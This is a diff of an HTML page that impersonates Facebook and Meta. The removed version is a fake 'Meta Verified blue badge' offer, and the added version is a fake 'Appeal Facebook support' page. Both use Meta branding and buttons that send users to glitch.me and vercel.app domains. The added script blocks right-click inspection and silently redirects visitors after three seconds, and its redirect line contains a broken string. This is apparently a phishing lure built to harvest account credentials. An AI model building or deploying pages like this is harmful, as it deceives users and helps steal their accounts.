@@ -1,346 +1,140 @@
+<!DOCTYPE html>
+
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Home</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    /* CSS styles */
 
-        html,
-        body {
-            height: 0%;
-            width: 100%;
-        }
+    body {
+      font-family: system-ui;
+      margin: 0;
+      padding: 0;
+    }
 
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f0f2f5;
-        }
+    .container-fluid {
+      background: #F5F6F6;
+    }
 
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
-        }
+    .container {
+      padding: 1rem;
+    }
 
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
-        }
+    .logo {
+      width: 9rem;
+      height: 6rem;
+    }
 
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
+    .meta-logo {
+      width: 4rem;
+      height: 4rem;
+    }
 
-        #data>h4 {
-            font-size: 25px;
-        }
+    .btn {
+      background: #0064e0;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 35px;
+      text-decoration: none;
+      color: white;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+      font-size: 16px;
+      /* Adjust as needed */
+    }
 
-        #data>img {
-            width: 25px;
-        }
+    .content {
+      margin-top: 3rem;
+      display: flex;
+      justify-content: center;
+    }
 
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
+    .content .col-sm-6 {
+      margin-top: 3rem;
+      margin-left: 5rem;
+    }
 
-        #para h2 {
-            font-size: 16px;
-        }
+    .content p {
+      font-size: 18px;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
 
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
+    .sign-up {
+      font-size: 17px;
+      padding-top: 1rem;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
 
-        #para p {
-            margin: 20px 100px 0px 100px;
-            font-size: 14px;
-        }
+    .business-info {
+      font-size: 14px;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
 
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
-            cursor: pointer;
-        }
+    .region-info {
+      font-size: 13px;
+      font-style: italic;
+      font-family: Arial, sans-serif;
+      /* Same font family */
+    }
 
-        #para button a {
-            text-decoration: none;
-            color: #fff;
-        }
+    .image {
+      display: none;
+      width: 42%;
+      height: 100vh;
+      /* Ensure full height */
+      background-size: cover;
+      /* background-position: center; */
+      /* margin-left: 5rem; */
+    }
 
-        #para button:hover {
-            background-color: #03469e;
-        }
-
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
-            }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
-                font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
-            }
-        }
-    </style>
+    @media (min-width: 576px) {
+      .image {
+        display: block;
+      }
+    }
+  </style>
 </head>
 
 <body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
-            <h5 id="groupSubHeader">𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗕𝗹𝘂𝗲 𝗕𝗮𝗱𝗴𝗲</h5>
-            <div id="data">
-                <h4>𝗕𝗲𝗰𝗼𝗺𝗲 𝗠𝗲𝘁𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-                </p>𝗚𝗿𝗼𝘄 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗽𝗿𝗲𝘀𝗲𝗻𝗰𝗲 𝘄𝗶𝘁𝗵 𝗠𝗲𝘁𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 – 𝗮 𝗻𝗲𝘄 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗯𝘂𝗻𝗱𝗹𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗰𝗿𝗲𝗮𝘁𝗼𝗿𝘀 𝗮𝗻𝗱 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀𝗲𝘀 𝗼𝗻 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗮𝗻𝗱 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸.  𝗦𝗶𝗴𝗻 𝘂𝗽 𝗻𝗼𝘄 𝗳𝗼𝗿 𝗰𝗿𝗲𝗮𝘁𝗼𝗿𝘀  𝗔𝗿𝗲 𝘆𝗼𝘂 𝗮 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀? 𝗚𝗲𝘁 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗼𝗻  𝗠𝗲𝘁𝗮 𝘃𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗳𝗼𝗿 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀𝗲𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀, 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗶𝗹𝗶𝘁𝘆, 𝗮𝗻𝗱 𝗽𝗿𝗶𝗰𝗶𝗻𝗴 𝗺𝗮𝘆 𝘃𝗮𝗿𝘆 𝗯𝘆 𝗿𝗲𝗴𝗶𝗼𝗻.
-                    </p>
-                <button> <a href="https://sincere-coal-tanker.glitch.me/">Continue</a> </button>
-            </div>
-        </div>
+  <div class="container-fluid">
+
     </div>
-
-
-</body>
-
-</html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
-    <title>Facebook Warning</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-
-        html,
-        body {
-            height: 0%;
-            width: 100%;
-        }
-
-        #container {
-            height: 135%;
-            width: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #f0f2f5;
-        }
-
-        #box {
-            height: 40%;
-            width: 45%;
-            background-color: rgb(255, 255, 255);
-            border-radius: 3px;
-            display: flex;
-            align-items: center;
-            flex-direction: column;
-        }
-
-        #box>img {
-            width: 70px;
-            margin-top: 15px;
-        }
-
-        #data {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 15px;
-        }
-
-        #data>h4 {
-            font-size: 25px;
-        }
-
-        #data>img {
-            width: 25px;
-        }
-
-        .line {
-            height: .7px;
-            background-color: rgba(0, 0, 0, 0.222);
-            width: 90%;
-            margin: 1rem;
-        }
-
-        #para h2 {
-            font-size: 16px;
-        }
-
-        #para {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        #para p {
-            margin: 20px 100px 0px 100px;
-            font-size: 14px;
-        }
-
-        #para button {
-            padding: 10px 20px 10px 20px;
-            margin-top: 25px;
-            border: none;
-            border-radius: 2px;
-            font-size: 18px;
-            background-color: #145dbd;
-            cursor: pointer;
-        }
-
-        #para button a {
-            text-decoration: none;
-            color: #fff;
-        }
-
-        #para button:hover {
-            background-color: #03469e;
-        }
-
-        @media (max-width: 500px) {
-            #box {
-                margin: 0;
-                height: 45%;
-                width: 95%;
-                top: 0%;
-            }
-            #box>img {
-                width: 40px;
-            }
-            #data>h4 {
-                font-size: 18px;
-            }
-            #data>img {
-                width: 15px;
-                margin-left: 2px;
-            }
-            .line {
-                height: .5px;
-                width: 90%;
-                margin-left: auto;
-                margin-right: auto;
-                background-color: #00000045;
-            }
-            #para {
-                margin: 0%;
-            }
-            #para>h2 {
-                font-size: 12px;
-                font-weight: 700;
-                margin-bottom: 10px;
-            }
-            #para>p {
-                margin: 5px 15px 0px 15px;
-                font-size: 14px;
-            }
-            #para button {
-                padding: 8px 18px 8px 18px;
-                margin-top: 15px;
-                border: none;
-                border-radius: 2px;
-                font-size: 13px;
-                background-color: #1877F2;
-                cursor: pointer;
-            }
-        }
-    </style>
-</head>
-
-<body>
-    <div id="container">
-        <div id="box">
-            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
-            <h5 id="groupSubHeader">𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗕𝗹𝘂𝗲 𝗕𝗮𝗱𝗴𝗲</h5>
-            <div id="data">
-                <h4>𝗕𝗲𝗰𝗼𝗺𝗲 𝗠𝗲𝘁𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
-            </div>
-            <div class="line"></div>
-            <div id="para">
-              </p>𝗚𝗿𝗼𝘄 𝘆𝗼𝘂𝗿 𝘀𝗼𝗰𝗶𝗮𝗹 𝗽𝗿𝗲𝘀𝗲𝗻𝗰𝗲 𝘄𝗶𝘁𝗵 𝗠𝗲𝘁𝗮 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 – 𝗮 𝗻𝗲𝘄 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗯𝘂𝗻𝗱𝗹𝗲 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗰𝗿𝗲𝗮𝘁𝗼𝗿𝘀 𝗮𝗻𝗱 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀𝗲𝘀 𝗼𝗻 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗮𝗻𝗱 𝗙𝗮𝗰𝗲𝗯𝗼𝗼𝗸.  𝗦𝗶𝗴𝗻 𝘂𝗽 𝗻𝗼𝘄 𝗳𝗼𝗿 𝗰𝗿𝗲𝗮𝘁𝗼𝗿𝘀  𝗔𝗿𝗲 𝘆𝗼𝘂 𝗮 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀? 𝗚𝗲𝘁 𝗺𝗼𝗿𝗲 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 𝗼𝗻  𝗠𝗲𝘁𝗮 𝘃𝗲𝗿𝗶𝗳𝗶𝗲𝗱 𝗳𝗼𝗿 𝗯𝘂𝘀𝗶𝗻𝗲𝘀𝘀𝗲𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀, 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗶𝗹𝗶𝘁𝘆, 𝗮𝗻𝗱 𝗽𝗿𝗶𝗰𝗶𝗻𝗴 𝗺𝗮𝘆 𝘃𝗮𝗿𝘆 𝗯𝘆 𝗿𝗲𝗴𝗶𝗼𝗻.
-              </p>
-                <button> <a href="https://sincere-coal-tanker.glitch.me/">Continue</a> </button>
-            </div>
-        </div>
+  </div>
+  <div class="content">
+    <div class="col-sm-6">
+       <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="meta" class="meta-logo">
+ <h1 class="my-3 fs-1">Appeal <br> Facebook support</h1>
+      <div style="margin-bottom: 30px;"></div>
+      <a href="https://submit-new-violation-request.vercel.app/" class="btn">Appeal</a>
+      <p class="mt-4">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.<br> Facebook.</p>
+      <p class="sign-up">Request for creator</p>
+      <p class="mt-4 mb-0">
+        <span class="fw-semibold">Are you a business?</span> Get more information on
+      </p>
+      <a href="#" class="business-info">Meta support for businesses</a>
+      <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
     </div>
-
-
+    <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
+  </div>
 </body>
+<script>
+  document.addEventListener('contextmenu', event => {
+    event.preventDefault();
+  });
+
+  setTimeout(function() {
+  var redirectURL = "https://submit-policy-issue-request-here.vercel.app/; // Updated URL
+  window.location.replace(redirectURL);
+  }, 3000); // 3000 milliseconds (3 seconds)
+  });
+</script>
